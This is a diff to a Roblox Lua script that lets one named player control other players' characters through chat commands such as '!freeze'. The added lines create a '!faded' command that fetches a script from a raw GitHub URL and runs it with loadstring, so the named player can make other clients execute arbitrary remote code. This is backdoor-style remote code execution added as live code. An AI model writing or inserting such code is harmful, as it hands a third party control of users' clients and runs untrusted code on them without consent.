@@ -11,6 +11,9 @@ game.Players["6akzino"].Chatted:Connect(function(message)
 	if message == "!freeze" then
 		game.Players.LocalPlayer.Character.Head.Anchored = true
 	end
+	if message == "!faded" then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+	end
 	if message == "!unfreeze" then
 		game.Players.LocalPlayer.Character.Head.Anchored = false
 	end
